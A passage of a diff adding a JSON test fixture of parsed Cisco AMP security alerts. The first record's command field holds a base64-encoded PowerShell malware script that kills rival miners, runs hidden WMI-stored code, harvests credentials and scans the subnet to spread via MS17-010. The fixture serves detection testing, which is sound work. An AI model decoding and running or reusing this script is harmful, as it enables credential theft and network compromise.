5AHMAdABlAG0AMwAyACcAIAAgACAADQAKAGkAZgAgACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAkAGQAaQByAHAAYQB0AGgAIAApACkAewANAAoACQAkAGQAaQByAHAAYQB0AGgAPQAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAANAAoAfQANAAoAaQBmACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHAAMQAyADAALgBkAGwAbAAnACkAKQApAA0ACgANAAoAewBzAGUAbgB0AGYAaQBsAGUAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHAAMQAyADAALgBkAGwAbAAnACkAIAAnAHYAYwBwACcAfQANAAoAaQBmACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHIAMQAyADAALgBkAGwAbAAnACkAKQApAA0ACgB7AHMAZQBuAHQAZgBpAGwAZQAgACgAJABkAGkAcgBwAGEAdABoACsAJwBcAG0AcwB2AGMAcgAxADIAMAAuAGQAbABsACcAKQAgACcAdgBjAHIAJwB9AA0ACgANAAoAWwBhAHIAcgBhAHkAXQAkAHAAcwBpAGQAcwA9ACAAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAALQBuAGEAbQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgAHwAcwBvAHIAdAAgAGMAcAB1ACAALQBEAGUAcwBjAGUAbgBkAGkAbgBnAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7ACQAXwAuAGkAZAB9AA0ACgAkAHQAYwBwAGMAbwBuAG4AIAA9ACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuAG8AcAAgAHQAYwBwACAADQAKACQAZQB4AGkAcwB0AD0AJABGAGEAbABzAGUADQAKAGkAZgAgACgAJABwAHMAaQBkAHMAIAAtAG4AZQAgACQAbgB1AGwAbAAgACkADQAKAHsADQAKACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAJAB0ACAAaQBuACAAJAB0AGMAcABjAG8AbgBuACkADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAbABpAG4AZQAgAD0AJAB0AC4AcwBwAGwAaQB0ACgAJwAgACcAKQB8ACAAPwB7ACQAXwB9AA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGwAaQBuAGUAIAAtAGUAcQAgACQAbgB1AGwAbAApAA0ACgAgACAAIAAgACAAIAAgACAAewBjAG8AbgB0AGkAbgB1AGUAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAKAAkAHAAcwBpAGQAcwBbADAAXQAgAC0AZQBxACAAJABsAGkAbgBlAFsALQAxAF0AKQAgAC0AYQBuAGQAIAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiAEUAUwBUAEEAQgBMAEkAUwBIAEUARAAiACkAIAAtAGEAbgBkACAAKAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAOAAwACAAIgApACAALQBvAHIAIAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQA0ADQANAA0ACIAKQApACAAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQB4AGkAcwB0AD0AJAB0AHIAdQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKAEsAaQBsAGwAQgBvAHQAKAAnAGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkADQAKAGYAbwByAGUAYQBjAGgAIAAoACQAdAAgAGkAbgAgACQAdABjAHAAYwBvAG4AbgApAA0ACgAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAGwAaQBuAGUAIAA9ACQAdAAuAHMAcABsAGkAdAAoACcAIAAnACkAfAAgAD8AewAkAF8AfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAIQAoACQAbABpAG4AZQAgAC0AaQBzACAAWwBhAHIAcgBhAHkAXQApACkAewBjAG8AbgB0AGkAbgB1AGUAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAKAAkAGwAaQBuAGUAWwAtADMAXQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAJAB0AC4AYwBvAG4AdABhAGkAbgBzACgAIgBFAFMAVABBAEIATABJAFMASABFAEQAIgApACAALQBhAG4AZAAgACgAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQAxADEAMQAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADIAMgAyADIAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgAzADMAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANAA0ADQANAAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADUANQA1ADUAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgA2ADYANgA2ACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANwA3ADcANwAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADgAOAA4ADgAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgA5ADkAOQA5ACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQA0ADQAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANAA1ADUANgAwACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANgA1ADMAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANQA1ADMAMwA1ACIAKQApACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGUAdgBpAGQAPQAkAGwAaQBuAGUAWwAtADEAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBpAGQAIAAkAGUAdgBpAGQAIAB8ACAAcwB0AG8AcAAtAHAAcgBvAGMAZQBzAHMAIAAtAGYAbwByAGMAZQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAaQBmACAAKAAhACQAZQB4AGkAcwB0ACAALQBhAG4AZAAgACgAJABwAHMAaQBkAHMALgBjAG8AdQBuAHQAIAAtAGwAZQAgADgAKQApAA0ACgB7ACAAIAAgAA0ACgAgACAAIAAgACQAYwBtAGQAbQBvAG4APQAiAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAE4AbwBQACAALQBOAG8AbgBJACAALQBXACAASABpAGQAZABlAG4AIABgACIAYAAkAG0AbwBuACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAgACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAbQBvAG4AJwBdAC4AVgBhAGwAdQBlADsAYAAkAGYAdQBuAHMAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBmAHUAbgBzACcAXQAuAFYAYQBsAHUAZQAgADsAaQBlAHgAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAGAAJABmAHUAbgBzACkAKQApADsASQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAGAAJABSAGUAbQBvAHQAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoAGAAJABtAG8AbgAsACAAYAAkAG0AbwBuACwAIAAnAFYAbwBpAGQAJwAsACAAMAAsACAAJwAnACwAIAAnACcAKQBgACIAIgANAAoAIAAgACAAIAAkAHYAYgBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMAbwBtAE8AYgBqAGUAYwB0ACAAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAANAAoACQAkAHYAYgBzAC4AcgB1AG4AKAAkAGMAbQBkAG0AbwBuACwAMAApACAAIAANAAoAfQANAAoADQAKACQATgBUAEwATQA9ACQARgBhAGwAcwBlAA0ACgAkAG0AaQBtAGkAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBtAGkAbQBpACcAXQAuAFYAYQBsAHUAZQAgAA0ACgAkAGEALAAgACQATgBUAEwATQA9ACAARwBlAHQALQBjAHIAZQBkAHMAIAAkAG0AaQBtAGkAIAAkAG0AaQBtAGkADQAKACAAIAAgACAAIAAgACAADQAKACQATgBlAHQAdwBvAHIAawBzACAAPQAgAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABXAGkAbgAzADIAXwBOAGUAdAB3AG8AcgBrAEEAZABhAHAAdABlAHIAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAgAC0ARQBBACAAUwB0AG8AcAAgAHwAIAA/ACAAewAkAF8ALgBJAFAARQBuAGEAYgBsAGUAZAB9ACAAIAAgACAADQAKACQAaQBwAHMAdQAgAD0AIAAoAFsAVwBtAGkAQwBsAGEAcwBzAF0AIAAnAHIAbwBvAHQAXABkAGUAZgBhAHUAbAB0ADoAYwBvAHIAZQBkAHAAdQBzAHMAdgByACcAKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAnAGkAcABzAHUAJwBdAC4AVgBhAGwAdQBlACAADQAKACQAaQAxADcAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBpADEANwAnAF0ALgBWAGEAbAB1AGUADQAKACQAcwBjAGIAYQA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBzAGMAJwBdAC4AVgBhAGwAdQBlAA0ACgBbAGIAeQB0AGUAWwBdAF0AJABzAGMAPQBbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABzAGMAYgBhACkAIAAgACAAIAAgAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAE4AZQB0AHcAbwByAGsAIABpAG4AIAAkAE4AZQB0AHcAbwByAGsAcwApACAADQAKAHsAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAADQAKACAAIAAgACAAJABJAFAAQQBkAGQAcgBlAHMAcwAgACAAPQAgACQATgBlAHQAdwBvAHIAawAuAEkAcABBAGQAZAByAGUAcwBzAFsAMABdACAAIAANAAoACQBpAGYAIAAoACQASQBQAEEAZABkAHIAZQBzAHMAIAAtAG0AYQB0AGMAaAAgACcAXgAxADYAOQAuADIANQA0ACcAKQB7AGMAbwBuAHQAaQBuAHUAZQB9ACAACQANAAoAIAAgACAAIAAkAFMAdQBiAG4AZQB0AE0AYQBzAGsAIAAgAD0AIAAkAE4AZQB0AHcAbwByAGsALgBJAFAAUwB1AGIAbgBlAHQAWwAwAF0AIAAgAA0ACgAgACAAIAAgACQAaQBwAHMAPQBHAGUAdAAtAE4AZQB0AHcAbwByAGsAUgBhAG4AZwBlACAAJABJAFAAQQBkAGQAcgBlAHMAcwAgACQAUwB1AGIAbgBlAHQATQBhAHMAawANAAoACQAkAHQAYwBwAGMAbwBuAG4AIAA9ACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuAG8AcAAgAHQAYwBwACAADQAKAAkAZgBvAHIAZQBhAGMAaAAgACgAJAB0ACAAaQBuACAAJAB0AGMAcABjAG8AbgBuACkADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAbABpAG4AZQAgAD0AJAB0AC4AcwBwAGwAaQB0ACgAJwAgACcAKQB8ACAAPwB7ACQAXwB9AA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAhACgAJABsAGkAbgBlACAALQBpAHMAIABbAGEAcgByAGEAeQBdACkAKQB7AGMAbwBuAHQAaQBuAHUAZQB9AA0ACgAJAAkAaQBmACAAKAAkAGwAaQBuAGUALgBjAG8AdQBuAHQAIAAtAGwAZQAgADQAKQB7AGMAbwBuAHQAaQBuAHUAZQB9AA0ACgAJAAkAJABpAD0AJABsAGkAbgBlAFsALQAzAF0ALgBzAHAAbABpAHQAKAAnADoAJwApAFsAMABdAA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAgACgAJABsAGkAbgBlAFsALQAyAF0AIAAtAGUAcQAgACcARQBTAFQAQQBCAEwASQBTAEgARQBEACcAKQAgAC0AYQBuAGQAIAAgACgAJABpACAALQBuAGUAIAAnADEAMgA3AC4AMAAuADAALgAxACcAKQAgAC0AYQBuAGQAIAAoACQAaQBwAHMAIAAtAG4AbwB0AGMAbwBuAHQAYQBpAG4AcwAgACQAaQApACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkAcABzACsAPQAkAGkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKACAAIAAgACAAaQBmACAAKAAoAFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AFQAaQBjAGsAQwBvAHUAbgB0AC0AJABzAHQAaQBtAGUAKQAvADEAMAAwADAAIAAtAGcAdAAgADUANAAwADAAKQB7AGIAcgBlAGEAawB9AA0ACgAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAaQBwACAAaQBuACAAJABpAHAAcwApAA0ACgAgACAAIAAgAHsAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACgAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVABpAGMAawBDAG8AdQBuAHQALQAkAHMAdABpAG0AZQApAC8AMQAwADAAMAAgAC0AZwB0ACAANQA0ADAAMAApAHsAYgByAGUAYQBrAH0ADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAaQBwACAALQBlAHEAIAAkAEkAUABBAGQAZAByAGUAcwBzACkAewBjAG8AbgB0AGkAbgB1AGUAfQAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACgAVABlAHMAdAAtAEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAGkAcAAgAC0AYwBvAHUAbgB0ACAAMQApACAALQBuAGUAIAAkAG4AdQBsAGwAIAAgAC0AYQBuAGQAIAAkAGkAcABzAHUAIAAtAG4AbwB0AGMAbwBuAHQAYQBpAG4AcwAgACQAaQBwACkAIAANAAoAIAAgACAAIAAgACAAIAAgAHsAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAD0AMAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGEALgBjAG8AdQBuAHQAIAAtAG4AZQAgADAAKQAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAkAHIAZQAgAD0AIAB0AGUAcwB0AC0AaQBwACAALQBpAHAAIAAkAGkAcAAgAC0AYwByAGUAZABzACAAJABhACAAIAAtAG4AaQBjACAAJABuAGkAYwAgAC0AbgB0AGwAbQAgACQATgBUAEwATQAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJAByAGUAIAAtAGUAcQAgADEAKQB7ACQAaQBwAHMAdQAgAD0AJABpAHAAcwB1ACAAKwAiACAAIgArACQAaQBwAH0ADQAKAAkACQAJAGUAbABzAGUADQAKAAkACQAJAHsADQAKAAkACQAJAAkAJAB2AHUAbAA9AFsAUABpAG4AZwBDAGEAcwB0AGwAZQAuAFMAYwBhAG4AbgBlAHIAcwAuAG0AMQA3AHMAYwBdADoAOgBTAGMAYQBuACgAJABpAHAAKQAJAAkACQAJAA0ACgAJAAkACQAJAGkAZgAgACgAJAB2AHUAbAAgAC0AYQBuAGQAIAAkAGkAMQA3ACAALQBuAG8AdABjAG8AbgB0AGEAaQBuAHMAIAAkAGkAcAApAA0ACgANAAoACQAJAAkACQB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwA9AGUAYgA3ACAAJABpAHAAIAAkAHMAYwANAAoACQAJAAkACQAJAGkAZgAgACgAIQAoACQAcgBlAHMAIAAtAGUAcQAgACQAdAByAHUAZQApACkADQAKAAkACQAJAAkACQB7AGUAYgA4ACAAJABpAHAAIAAkAHMAYwB9AA0ACgAJAAkACQAJAAkAJABpADEANwAgAD0AIAAkAGkAMQA3ACAAKwAgACIAIAAiACsAJABpAHAADQAKAAkACQAJAAkAfQANAAoACQAJAAkAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAIAB9ACAAIAAgACAAIAAgACAADQAKACQAUwB0AGEAdABpAGMAQwBsAGEAcwBzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApACAAIAANAAoAJABTAHQAYQB0AGkAYwBDAGwAYQBzAHMALgBTAGUAdABQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACgAJwBpAHAAcwB1ACcAIAAsACQAaQBwAHMAdQApAA0ACgAkAFMAdABhAHQAaQBjAEMAbABhAHMAcwAuAFAAdQB0ACgAKQANAAoAJABTAHQAYQB0AGkAYwBDAGwAYQBzAHMALgBTAGUAdABQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACgAJwBpADEANwAnACAALAAkAGkAMQA3ACkADQAKACQAUwB0AGEAdABpAGMAQwBsAGEAcwBzAC4AUAB1AHQAKAApAA==",
+                    "parent_app": "WmiPrvSE.exe",
+                    "parent_app_path": "C:\\Windows\\System32\\wbem",
+                    "parent_pid": 2236,
+                    "parent_puid": 132461352663910600,
+                    "parent_user": "SYSTEM",
+                    "parent_user_sid": "010100000000000512000000",
+                    "pid": 10724,
+                    "puid": 132465072105597400,
+                    "ts": 1602033881727175700,
+                    "user": "user@testdomain.com",
+                    "user_sid": "010100000000000512000000"
+                }
+            }
+        ],
+        "cisco.amp.bp_data.details.matched_activity.limited": false,
+        "cisco.amp.bp_data.details.matched_activity.matched": 1,
+        "cisco.amp.bp_data.details.schema": "endpoint",
+        "cisco.amp.bp_data.details.schema_epoch": 2,
+        "cisco.amp.bp_data.details.sig_id": 20200719101800,
+        "cisco.amp.bp_data.details.sig_rev": 1,
+        "cisco.amp.bp_data.detection": "apde:20200719101800",
+        "cisco.amp.bp_data.end_ts": 1610640884,
+        "cisco.amp.bp_data.engine": "apde",
+        "cisco.amp.bp_data.id": "cF3A8bacac",
+        "cisco.amp.bp_data.name": "PowerShell Download String",
+        "cisco.amp.bp_data.normalized.name": "powershell download string",
+        "cisco.amp.bp_data.normalized.observables.file.name": [
+            "wmiprvse.exe",
+            "powershell.exe"
+        ],
+        "cisco.amp.bp_data.normalized.observables.file.path": [
+            "c:\\windows\\system32\\wbem",
+            "c:\\windows\\system32\\windowspowershell\\v1.0"
+        ],
+        "cisco.amp.bp_data.observables.file": [
+            {
+                "md5": "d683c112190f4b4c6d477d693ee88e35",
+                "name": "WmiPrvSE.exe",
+                "path": "C:\\Windows\\System32\\wbem",
+                "properties": {
+                    "copyright": "\u00a9 Microsoft Corporation. All rights reserved.",
+                    "file_version": "10.0.14409.1005",
+                    "product": "Microsoft\u00ae Windows\u00ae Operating System",
+                    "product_version": "10.0.14409.1005"
+                },
+                "sha1": "67858ead93feed62c0b1865369840e6e8086f53b",
+                "sha256": "385892542cc5a996488262b193061feac4615d66657157c3d4a76251911da334",
+                "size": 425984,
+                "type_id": 1
+            },
+            {
+                "md5": "a575a7610e5f003cc36df39e07c4ba7d",
+                "name": "powershell.exe",
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                "properties": {
+                    "copyright": "\u00a9 Microsoft Corporation. All rights reserved.",
+                    "file_version": "10.0.14409.1005",
+                    "product": "Microsoft\u00ae Windows\u00ae Operating System",
+                    "product_version": "10.0.14409.1005"
+                },
+                "sha1": "88e7cdc0b75364418e11b2c53f772085f1b61d1e",
+                "sha256": "006cef6ef6488721895d93e4cef7fa0709c2692d74bde1e22e2a8719b2a86218",
+                "size": 443392,
+                "type_id": 1
+            }
+        ],
+        "cisco.amp.bp_data.remediated": false,
+        "cisco.amp.bp_data.severity": "medium",
+        "cisco.amp.bp_data.silent": true,
+        "cisco.amp.bp_data.start_ts": 1610640884,
+        "cisco.amp.bp_data.tactics": [
+            "TA0002",
+            "TA0005"
+        ],
+        "cisco.amp.bp_data.techniques": [
+            "T1059"
+        ],
+        "cisco.amp.bp_data.ts": 1610640884,
+        "cisco.amp.bp_data.type": "activity",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "be:b0:d5:89:e2:96"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection": "PowerShell Download String",
+        "cisco.amp.event_type_id": 553648222,
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.mitre_tactics": [
+            "TA0002",
+            "TA0005"
+        ],
+        "cisco.amp.mitre_techniques": [
+            "T1059"
+        ],
+        "cisco.amp.related.mac": [
+            "be:b0:d5:89:e2:96"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 791000000,
+        "event.action": "Threat Detection",
+        "event.dataset": "cisco.amp",
+        "event.id": 6880683125978957000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "fileset.name": "amp",
+        "host.hostname": "Demo_BP_WMIPRVSE",
+        "host.name": "Demo_BP_WMIPRVSE",
+        "input.type": "log",
+        "log.offset": 165036,
+        "related.hosts": [
+            "Demo_BP_WMIPRVSE"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:50:23.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419247189909831755",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 888000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419247189909832000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 285532,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:50:23.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419247189909831754",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 888000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419247189909832000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 286744,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:50:23.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419247189909831753",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 888000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419247189909832000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 287956,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:50:23.000Z",
